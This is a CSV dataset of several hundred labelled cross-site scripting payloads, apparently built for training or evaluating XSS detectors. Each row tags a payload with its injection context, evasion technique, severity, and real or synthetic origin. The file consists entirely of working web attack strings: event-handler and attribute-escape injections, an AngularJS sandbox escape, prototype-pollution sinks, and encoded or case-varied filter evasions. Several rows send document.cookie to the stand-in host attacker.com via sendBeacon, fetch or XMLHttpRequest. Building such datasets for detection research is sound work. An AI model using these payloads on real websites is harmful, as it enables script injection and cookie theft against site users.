payload,context,technique,severity,length,source
<kbd id=x tabindex=1 ondeactivate=alert(1)></kbd><input id=y autofocus>,tag_injection,none,medium,71,real
"""><Img srC=x onMouSedOwn=alErt(loCatIon.haSh)>",attribute_escape,synthetic,medium,46,synthetic
__proto__[%22ontouchmove%22]=prompt(document.cookie),dom_sink,synthetic,high,52,synthetic
"<meter draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</meter>",tag_injection,none,medium,87,real
"<time onmouseout=""alert(1)"">AnonKryptiQuz</time>",tag_injection,none,medium,48,real
"<small onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</small>",tag_injection,none,medium,69,real
<custom tags onpointerout=alert(1) style=display:block>AnonKryptiQuz</custom tags>,tag_injection,none,medium,82,real
OnsUbmIt=AleRt(LocAtiOn.HasH),event_handler,synthetic,medium,29,synthetic
"""><Img srC=x onCopY=cOnsOle.loG('XSS')>",attribute_escape,synthetic,medium,39,synthetic
\' OngEstUreEnd=prOmpT('XSS')//,attribute_escape,synthetic,medium,31,synthetic
""" ontouchst&#97;rt=consol&#101;.log(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,low,63,synthetic
"	onbegin=confirm(String.fromCharCode(88,83,83))",event_handler,synthetic,high,47,synthetic
	on&#97;uxclick=confirm(docum&#101;nt.dom&#97;in),event_handler,synthetic,medium,49,synthetic
%27 onmousedown=confirm(1) %27,attribute_escape,synthetic,medium,30,synthetic
<div style=xss:expressio\006e(alert(1))>,generic,none,medium,40,real
 onDraGovEr=ConFirM('XSS'),event_handler,synthetic,medium,26,synthetic
onmous&#101;up=j&#97;v&#97;script:confirm(docum&#101;nt.dom&#97;in),event_handler,synthetic,medium,67,synthetic
%27><img src=x oncopy=confirm(location.hash)>,attribute_escape,synthetic,medium,45,synthetic
"<ruby oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,98,real
"""%3E%3Cmtext onstalled=console.log(document.domain)%3E",tag_injection,synthetic,medium,54,synthetic
"<tt oncontextmenu=""alert(1)"">AnonKryptiQuz</tt>",tag_injection,none,medium,47,real
"<div draggable=""true"" contenteditable>drag me</div><object ondrop=alert(1) contenteditable>drop here</object>",tag_injection,none,medium,109,real
on&#97;nim&#97;tion&#101;nd=consol&#101;.log&#40;'XSS'&#41;,event_handler,synthetic,low,59,synthetic
"{{c='%27%27.sub.call;b='%27%27.sub.bind;a='%27%27.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync('alert(document.domain)');m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a='%27%27.sub;$eval('a(b.c)'):[].push.apply=a:}}",template_injection,encoding|url_encoding,medium,391,real
<!--><Img onPagEswAp=ConSolE.lOg(1)>,tag_injection,synthetic,medium,36,synthetic
%3Ctr x=y onfocus=confirm('XSS')%3E,tag_injection,synthetic,medium,35,synthetic
"<style>@keyframes x{}</style><dfn style=""animation-name:x"" onanimationstart=""alert(1)""></dfn>",tag_injection,none,medium,93,real
"Obj&#101;ct.&#97;ssign(window,{""onvolum&#101;ch&#97;ng&#101;"":f&#101;tch})",dom_sink,synthetic,low,74,synthetic
"<script\x20type=""text/javascript"">javascript:alert(9535);</script>",script_injection,none,medium,66,real
"javascr	ipt:void(confirm(String.fromCharCode(88,83,83)))",js_uri,synthetic,high,56,synthetic
"<form onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</form>",tag_injection,none,medium,61,real
"<audio controls autoplay ontimeupdate=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",tag_injection,none,medium,101,real
"<keygen onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</keygen>",tag_injection,none,medium,87,real
{{constructor[%27constructor%27](%27alert(document.cookie)%27)()}},template_injection,synthetic,high,66,synthetic
"SetTimEouT(""ConSolE.lOg(BtoA(dOcuMenT.cOokIe))"",0)",dom_sink,synthetic,high,50,synthetic
"element.insertAdjacentHTML(""beforeend"",""%3Cimg src=x onerror=console.log(location.hash)%3E"")",dom_sink,synthetic,medium,92,synthetic
"""><img src=x oninvalid=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,61,synthetic
OnfOcuSouT=aLerT('XSS'),event_handler,synthetic,medium,23,synthetic
""" ><svg oninput=\u0061lert(document.domain)>",attribute_escape,synthetic,low,44,synthetic
	ondrop=consol&#101;.log(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,50,synthetic
"'><img src=x onload=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,57,synthetic
""" %3E%3Csvg onbeforematch=confirm(1)%3E",attribute_escape,synthetic,medium,39,synthetic
"<div draggable=""true"" contenteditable>drag me</div><center ondrop=alert(1) contenteditable>drop here</center>",tag_injection,none,medium,109,real
"<blink draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</blink>",tag_injection,none,medium,68,real
"<applet draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</applet>",tag_injection,none,medium,65,real
"EvaL(""ConSolE.lOg(DocUmeNt.DomAin)"")",dom_sink,synthetic,medium,36,synthetic
""" onplaying=\u0061lert(location.hash) """,attribute_escape,synthetic,low,39,synthetic
`><Img srC=x onLoaD=cOnsOle.loG(1)>,attribute_escape,synthetic,medium,35,synthetic
<scRipT>wIndOw['coNsoLe.Log'](LocAtiOn.HasH)</scRipT>,script_injection,synthetic,low,53,synthetic
"""><img src=x onw&#101;bkit&#97;nim&#97;tion&#101;nd=prompt(1)>",attribute_escape,synthetic,medium,62,synthetic
"""><Img srC=x onKeyDowN=pRomPt('XSS')>",attribute_escape,synthetic,medium,37,synthetic
' %3E%3Csvg ontoggle=confirm('XSS')%3E,attribute_escape,synthetic,medium,38,synthetic
onend=\u0061lert(1),event_handler,synthetic,low,19,synthetic
%22 onvolumechange=alert(%27XSS%27) %22,attribute_escape,synthetic,medium,39,synthetic
"loc&#97;tion=""j&#97;v&#97;script:confirm(docum&#101;nt.dom&#97;in)""",dom_sink,synthetic,medium,67,synthetic
%22 ongestureend=console.log(%27XSS%27) %22,attribute_escape,synthetic,medium,43,synthetic
\%22 onpaste=confirm(%27XSS%27)//,attribute_escape,synthetic,medium,33,synthetic
<object x=y onanimationcancel=alert(document.domain)>,tag_injection,synthetic,medium,53,synthetic
"""><img src=x onbeforematch=alert('XSS')>",attribute_escape,synthetic,medium,40,synthetic
<script x=y onclick=prompt('XSS')>,tag_injection,synthetic,medium,34,synthetic
<animatemotion onsecuritypolicyviolation=console.log(%27XSS%27)>,tag_injection,synthetic,medium,64,synthetic
"<diV oNpaUse=prOmpT(STriNg.FroMChArCOde(88,83,83))>",tag_injection,synthetic,high,51,synthetic
"<progress onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</progress>",tag_injection,none,medium,77,real
"<figure draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</figure>",tag_injection,none,medium,90,real
""" ><svg ontouchmove=confirm('XSS')>",attribute_escape,synthetic,medium,35,synthetic
"<summary onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</summary>",tag_injection,none,medium,75,real
"setInterval(%22fetch(document.cookie+%27&loc=%27+location.href)%22,100)",dom_sink,synthetic,high,71,synthetic
"""><img src=x onfocusout=confirm(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,medium,55,synthetic
"java	scr	ipt:console.log(String.fromCharCode(88,83,83))",js_uri,synthetic,high,55,synthetic
"<input type=text value=jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e></input>",js_uri,comment_injection|url_encoding,medium,176,real
""" oNclOse=coNsoLe.Log(loCatIon.haSh) """,attribute_escape,synthetic,medium,38,synthetic
"%3Cdiv onpause=prompt(String.fromCharCode(88,83,83))/%3E",tag_injection,synthetic,high,56,synthetic
"""><Img srC=x onResEt=AleRt(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape,synthetic,high,58,synthetic
&quOt; onDroP=cOnfIrm(1) x=&quOt;,attribute_escape,synthetic,medium,33,synthetic
"__proto__[""onp&#97;g&#101;r&#101;v&#101;&#97;l""]=XMLHttpR&#101;qu&#101;st(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)",dom_sink,synthetic,high,131,synthetic
<col onpointerleave=alert(1) style=display:block>AnonKryptiQuz</col>,tag_injection,none,medium,68,real
"""><source oninput=alert(location.hash)>",tag_injection,synthetic,medium,39,synthetic
"document.write(""%3Cimg src=x onerror=fetch(navigator.sendBeacon('//attacker.com',document.cookie))%3E"")",dom_sink,synthetic,high,103,synthetic
OnpOinTerCanCel=prOmpT&#40;LocAtiOn.HasH&#41;,event_handler,synthetic,low,45,synthetic
<header onpointerenter=alert(1) style=display:block>AnonKryptiQuz</header>,tag_injection,none,medium,74,real
%3Cselect src=x onpromptdismiss=console.log(1)%3E,tag_injection,synthetic,medium,49,synthetic
%3Cmtext onfocusout=confirm(location.hash)/%3E,tag_injection,synthetic,medium,46,synthetic
"<script>setTimeout('console.log(String.fromCharCode(88,83,83))',0)</script>",script_injection,synthetic,high,75,synthetic
"<embed ondblclick=""alert(1)"">AnonKryptiQuz</embed>",tag_injection,none,medium,50,real
onmouseup=console.log&#40;%27XSS%27&#41;,event_handler,synthetic,low,40,synthetic
<nav onpointerleave=alert(1) style=display:block>AnonKryptiQuz</nav>,tag_injection,none,medium,68,real
"<a href=""about:<script>document.vulnerable=true;</script>"">",dom_sink,none,low,59,real
"\"" OncUt=AleRt('XSS')//",attribute_escape,synthetic,medium,23,synthetic
"%3Cmeta
onhashchange=confirm(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,62,synthetic
"""><svg/onload=confirm(1)>""@x.y",tag_injection,none,medium,30,real
	onw&#97;iting=confirm(docum&#101;nt.dom&#97;in),event_handler,synthetic,medium,48,synthetic
<img onk&#101;ypr&#101;ss=consol&#101;.log(1) onk&#101;ypr&#101;ss=consol&#101;.log(1)>,tag_injection,synthetic,low,87,synthetic
<script>+-+-1-+-+alert(4141)</script>,script_injection,none,medium,37,real
\%22 onhashchange=prompt(%27XSS%27)//,attribute_escape,synthetic,medium,37,synthetic
&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;,js_uri,none,medium,49,real
"<style>:target {transform: rotate(180deg);}</style><bdi id=x style=""transition:transform 2s"" ontransitionrun=print()></bdi>",tag_injection,none,low,123,real
<nobr onpointerout=alert(1) style=display:block>AnonKryptiQuz</nobr>,tag_injection,none,medium,68,real
"%3Cscript%3EsetTimeout('console.log('XSS')',0)%3C/script%3E",script_injection,synthetic,medium,59,synthetic
"location=""javascript:XMLHttpRequest(btoa(document.cookie))""",dom_sink,synthetic,high,59,synthetic
"<a href=""\x08javascript:javascript:alert(6145)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74,real
"<div draggable=""true"" contenteditable>drag me</div><canvas ondrop=alert(1) contenteditable>drop here</canvas>",tag_injection,none,medium,109,real
 onWebKitFulLscReeNchAngE=pRomPt(1),event_handler,synthetic,medium,35,synthetic
<form onwaiting=confirm(1)/>,tag_injection,synthetic,medium,28,synthetic
' onfocusout=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ',attribute_escape,synthetic,low,52,synthetic
' oNfoCusOut=coNfiRm(LocAtiOn.HasH) ',attribute_escape,synthetic,medium,37,synthetic
"""><img src=x onerror=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,58,synthetic
<tr src=x onpointerrawupdate=\u0061lert(location.hash)>,tag_injection,synthetic,low,55,synthetic
"<rp onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></rp>",tag_injection,none,medium,277,real
%27 ><svg ongesturestart=alert(location.hash)>,attribute_escape,synthetic,medium,46,synthetic
"<div x=y onp&#97;us&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,73,synthetic
"<style>@keyframes x{}</style><animate style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></animate>",tag_injection,none,medium,107,real
"<article draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</article>",tag_injection,none,medium,87,real
""";alert(123);t=""",attribute_escape,none,medium,16,real
onstalled=alert/**/(document.domain),event_handler,synthetic,low,36,synthetic
"__proto__[""onsecuritypolicyviolation""]=\u0061lert(navigator.sendBeacon('//attacker.com',document.cookie))",dom_sink,synthetic,high,105,synthetic
"`%3E%3Cimg src=x onended=alert(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,64,synthetic
<area onpointercancel=console.log(document.domain)/>,tag_injection,synthetic,medium,52,synthetic
OntRanSitIonRun=alErt/**/(dOcuMenT.dOmaIn),event_handler,synthetic,low,42,synthetic
"<acronym ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</acronym>",tag_injection,none,medium,95,real
""" onended=confirm(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,high,50,synthetic
"<style>@keyframes x{}</style><video2 style=""animation-name:x"" onwebkitanimationend=""alert(1)""></video2>",tag_injection,none,medium,103,real
"<small onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</small>",tag_injection,none,medium,70,real
%27><img src=x onload=console.log(1)>,attribute_escape,synthetic,medium,37,synthetic
"""^prompt(9)^""",attribute_escape,none,medium,13,real
"Obj&#101;ct.&#97;ssign(window,{""oncont&#101;xtm&#101;nu"":&#101;v&#97;l})",dom_sink,synthetic,low,72,synthetic
<scRipT>cOnsOle.loG`'XSS'`</scRipT>,script_injection,synthetic,low,35,synthetic
"<style>@keyframes x{}</style><abbr style=""animation-name:x"" onanimationend=""alert(1)""></abbr>",tag_injection,none,medium,93,real
<script>//confirm(document.domain)</script>,script_injection,synthetic,medium,43,synthetic
<i onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</i><input value=clickme>,tag_injection,none,medium,93,real
""" onpointerdown=\u0061lert(document.domain) """,attribute_escape,synthetic,low,45,synthetic
"__proto__[""onpl&#97;y""]=f&#101;tch(bto&#97;(docum&#101;nt.cooki&#101;))",dom_sink,synthetic,low,71,synthetic
"document.body.innerHTML=""%3Cimg src=x onerror=alert(1)%3E""",dom_sink,synthetic,high,58,synthetic
"\"" onprompt&#97;ction=prompt(1)//",attribute_escape,synthetic,medium,33,synthetic
<svg><menuitem onload=alert(1)></menuitem>,tag_injection,none,medium,42,real
"<!--><m&#97;rqu&#101;&#101; onclos&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,89,synthetic
<cite id=x tabindex=1 onbeforeactivate=alert(1)></cite>,tag_injection,none,medium,55,real
"<sub onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</sub>",tag_injection,none,medium,65,real
"<wbr id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></wbr>",tag_injection,none,medium,82,real
"setInterval(%22prompt(1)%22,100)",dom_sink,synthetic,high,32,synthetic
<table onsearch=prompt(1)/>,tag_injection,synthetic,medium,27,synthetic
onk&#101;ydown=confirm&#40;1&#41;,event_handler,synthetic,low,33,synthetic
' %3E%3Csvg onpopstate=prompt(1)%3E,attribute_escape,synthetic,medium,35,synthetic
"""><img src=x onpromptdismiss=prompt(document.domain)>",attribute_escape,synthetic,medium,53,synthetic
%27 ><svg onpagereveal=alert(location.hash)>,attribute_escape,synthetic,medium,44,synthetic
""" ongotpoint&#101;rc&#97;ptur&#101;=&#97;l&#101;rt(1) """,attribute_escape,synthetic,low,55,synthetic
"J&#97;VasCriPt:ProMpt(StRinG.fRomChaRCoDe(88,83,83))",js_uri,synthetic,high,52,synthetic
%22><img src=x onended=alert(1)>,attribute_escape,synthetic,medium,32,synthetic
`%3E%3Cimg src=x ongesturestart=prompt('XSS')%3E,attribute_escape,synthetic,medium,48,synthetic
"`""'><img src=xxx:x onerror\x00=javascript:alert(1)>",js_uri,none,medium,51,real
<imG	oNweBkiTfuLlsCreEncHanGe=AleRt('XSS')>,tag_injection,synthetic,medium,43,synthetic
javascr	ipt:void(prompt(1)),js_uri,synthetic,medium,27,synthetic
"<label onmousedown=""alert(1)"">AnonKryptiQuz</label>",tag_injection,none,medium,51,real
"<p onbeforetoggle=\u0061lert(String.fromCharCode(88,83,83))/>",tag_injection,synthetic,high,61,synthetic
<&#101;mb&#101;d x=y onmozfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,105,synthetic
"<input draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</input>",tag_injection,none,medium,66,real
"""><img src=x ontoggle=alert(document.domain)>",attribute_escape,synthetic,medium,45,synthetic
	onfocusin=confirm(document.domain),event_handler,synthetic,medium,35,synthetic
"document.write(""%3Cimg src=x onerror=confirm(1)%3E"")",dom_sink,synthetic,medium,52,synthetic
"&#101;v&#97;l(""consol&#101;.log('XSS')"")",dom_sink,synthetic,low,40,synthetic
'><Img srC=x onTouChmOve=coNsoLe.Log('XSS')>,attribute_escape,synthetic,medium,44,synthetic
" onpoint&#101;rc&#97;nc&#101;l=confirm(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,78,synthetic
"<xmp onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</xmp>",tag_injection,none,medium,59,real
' ><svg onpoint&#101;rov&#101;r=consol&#101;.log('XSS')>,attribute_escape,synthetic,low,56,synthetic
"<!'/*""/*/'/*/""/*--></Script><Image SrcSet=K */; OnError=confirm`AnonKryptiQuz` //>",tag_injection,comment_injection|case_variation,low,82,real
"""><h1><IFRAME SRC=""javascript:alert('XSS');""></IFRAME>"">123</h1>",js_uri,none,medium,64,real
"window[%22console.log%22](navigator.sendBeacon(%27//attacker.com%27,document.cookie))",dom_sink,synthetic,high,85,synthetic
"<header oncut=""alert(1)"" contenteditable>AnonKryptiQuz</header>",tag_injection,none,medium,63,real
"`><img src=x onended=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,58,synthetic
"' oNanImaTioNitEraTioN=aLerT(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape,synthetic,high,61,synthetic
"<li onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</li>",tag_injection,none,medium,57,real
<script>/*/consol&#101;.log('XSS')</script>,script_injection,synthetic,low,43,synthetic
"<video onpaste=alert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,52,synthetic
"""><img src=x onb&#101;for&#101;p&#97;st&#101;=confirm(docum&#101;nt.dom&#97;in)>",attribute_escape,synthetic,medium,80,synthetic
"<u onmouseleave=""alert(1)"">AnonKryptiQuz</u>",tag_injection,none,medium,44,real
%3Cmtext onmousedown=console.log(1)/%3E,tag_injection,synthetic,medium,39,synthetic
"""%3E%3Cimg src=x onpageswap=alert(document.domain)%3E",attribute_escape,synthetic,medium,53,synthetic
"<m&#97;rqu&#101;&#101;
onpromptdismiss=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,low,96,synthetic
"Obj&#101;ct.&#97;ssign(window,{""onp&#97;g&#101;r&#101;v&#101;&#97;l"":XMLHttpR&#101;qu&#101;st})",dom_sink,synthetic,high,95,synthetic
<noembed onpointerenter=alert(1) style=display:block>AnonKryptiQuz</noembed>,tag_injection,none,medium,76,real
onr&#101;s&#101;t=j&#97;v&#97;script:confirm('XSS'),event_handler,synthetic,medium,51,synthetic
<listing onpointermove=alert(1) style=display:block>AnonKryptiQuz</listing>,tag_injection,none,medium,75,real
"<content draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</content>",tag_injection,none,medium,67,real
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=prompt(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)>"")",dom_sink,synthetic,medium,117,synthetic
"\"" onmousewheel=alert(document.domain)//",attribute_escape,synthetic,medium,40,synthetic
"' ><svg onmozfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,104,synthetic
"(n&#101;w Function(""consol&#101;.log(bto&#97;(docum&#101;nt.cooki&#101;))""))();",dom_sink,synthetic,low,79,synthetic
 onp&#97;st&#101;=confirm(docum&#101;nt.dom&#97;in),event_handler,synthetic,medium,51,synthetic
"element.insertAdjacentHTML(""beforeend"",""%3Cimg src=x onerror=XMLHttpRequest(navigator.sendBeacon('//attacker.com',document.cookie))%3E"")",dom_sink,synthetic,high,136,synthetic
"window[""alert""](String.fromCharCode(88,83,83))",dom_sink,synthetic,high,46,synthetic
%EF%BC%9Cimg%20src%3Dxxx%20onerror%3Dalert(1)%EF%BC%9E,generic,url_encoding,medium,54,real
onscrollsnapchange=javascript:alert(1),event_handler,synthetic,medium,38,synthetic
"'><Img srC=x onBefOrePasTe=ProMpt(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape,synthetic,high,65,synthetic
<BODY ONLOAD=javascript:alert(1)>,js_uri,case_variation,medium,33,real
<b onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</b><input value=clickme>,tag_injection,none,medium,102,real
"<script src=""data:text/javascript,alert(9252)""></script>",script_injection,none,medium,56,real
"<link onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</link>",tag_injection,none,medium,66,real
"<m&#97;rqu&#101;&#101; x=y onclos&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,88,synthetic
<meta onpointerover=alert(1) style=display:block>AnonKryptiQuz</meta>,tag_injection,none,medium,69,real
"""><img src=x onp&#97;st&#101;=consol&#101;.log(1)>",attribute_escape,synthetic,low,50,synthetic
}alert(/INJECTX/);{//,generic,none,medium,21,real
"SetTimEouT(""ProMpt(1)"",0)",dom_sink,synthetic,medium,25,synthetic
"<STYLE>li {list-style-image: url(""javascript:alert('AnonKryptiQuz')"");}</STYLE><UL><LI>AnonKryptiQuz</br>",js_uri,case_variation,medium,105,real
"\"" OniNpuT=cOnfIrm(1)//",attribute_escape,synthetic,medium,23,synthetic
"<link
oninput=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,low,55,synthetic
<script>prompt('XSS')</script>,script_injection,synthetic,medium,30,synthetic
"<diV sRc=X oNweBkiTfuLlsCreEncHanGe=ProMpt(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection,synthetic,high,74,synthetic
"<script onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</script>",script_injection,none,medium,71,real
onp&#97;g&#101;show=j&#97;v&#97;script:prompt(1),event_handler,synthetic,medium,48,synthetic
"<kbd onclick=""alert(1)"">AnonKryptiQuz</kbd>",tag_injection,none,medium,43,real
"%3Ctr
onpointerrawupdate=alert(location.hash)%3E",tag_injection,synthetic,medium,48,synthetic
"\"" onclos&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh)//",attribute_escape,synthetic,low,57,synthetic
"<img src=""/"" =_="" title=""onerror='prompt(1)'"">",tag_injection,none,medium,46,real
'><Img srC=x onRepEat=alErt(loCatIon.haSh)>,attribute_escape,synthetic,medium,43,synthetic
 onGesTurEstArt=coNfiRm(DocUmeNt.DomAin),event_handler,synthetic,medium,40,synthetic
<form/onr&#101;s&#101;t=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,67,synthetic
'><Img srC=x onPopStaTe=AleRt(1)>,attribute_escape,synthetic,medium,33,synthetic
""" oNcoPy=ConSolE.lOg(1) """,attribute_escape,synthetic,medium,25,synthetic
 onblur=&#97;l&#101;rt(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,48,synthetic
<tr/onAniMatIonEnd=prOmpT('XSS')>,tag_injection,synthetic,medium,33,synthetic
"__proto__[""onvolum&#101;ch&#97;ng&#101;""]=consol&#101;.log(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))",dom_sink,synthetic,low,159,synthetic
"<style>:target {color:red;}</style><ul id=x style=""transition:color 1s"" ontransitionend=alert(1)></ul>",tag_injection,none,medium,102,real
<IMG SRC=JaVaScRiPt:alert('AnonKryptiQuz')>,js_uri,case_variation,medium,43,real
&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x78;&#x73;&#x73;&#x27;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;,generic,html_entity,low,174,real
"""><img src=x onerror=this.innerHTML=''><script>alert(document.domain)</script>"">",dom_sink,none,high,80,real
"<div draggable=""true"" contenteditable>drag me</div><meta ondrop=alert(1) contenteditable>drop here</meta>",tag_injection,none,medium,105,real
\' onsearch=alert('XSS')//,attribute_escape,synthetic,medium,26,synthetic
"<embed onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</embed>",tag_injection,none,medium,71,real
onpoint&#101;rmov&#101;=confirm&#40;'XSS'&#41;,event_handler,synthetic,low,46,synthetic
<image x=y onchange=\u0061lert(1)>,tag_injection,synthetic,low,34,synthetic
<script>Function(%27confirm(1)%27)();</script>,script_injection,synthetic,medium,46,synthetic
"'><img src=x on&#97;nim&#97;tionc&#97;nc&#101;l=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,103,synthetic
<td/onKeyUp=ConFirM(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,37,synthetic
' oNpaGerEveAl=AleRt(LocAtiOn.HasH) ',attribute_escape,synthetic,medium,37,synthetic
%3Cimg%20src%3Dx%20onerror%3D%60alert%28%60AnonKryptiQuz%60%29%60%3E,generic,url_encoding,low,68,real
%22 ondrop=alert(%27XSS%27) %22,attribute_escape,synthetic,medium,31,synthetic
""" oNdbLclIck=coNsoLe.Log('XSS') """,attribute_escape,synthetic,medium,33,synthetic
"<li draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</li>",tag_injection,none,medium,82,real
"__pRotO__[""oNtrAnsItiOneNd""]=aLerT(lOcaTioN.hAsh)",dom_sink,synthetic,medium,49,synthetic
"<content onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</content>",tag_injection,none,medium,67,real
<hr onpointermove=alert(1) style=display:block>AnonKryptiQuz</hr>,tag_injection,none,medium,65,real
"""%3E%3Cimg src=x onselect=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,67,synthetic
&quot; ontouchst&#97;rt=consol&#101;.log(1) x=&quot;,attribute_escape,synthetic,low,52,synthetic
<taBle srC=x onCopY=cOnfIrm('XSS')>,tag_injection,synthetic,medium,35,synthetic
&quot; onsecuritypolicyviolation=console.log('XSS') x=&quot;,attribute_escape,synthetic,medium,60,synthetic
<image2 onfocus=alert(1) autofocus tabindex=1>,tag_injection,none,medium,46,real
<m&#97;th x=y oncopy=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,64,synthetic
<script\x20>javascript:alert(8352)</script>,script_injection,none,medium,43,real
javascr	ipt:void(prompt('XSS')),js_uri,synthetic,medium,31,synthetic
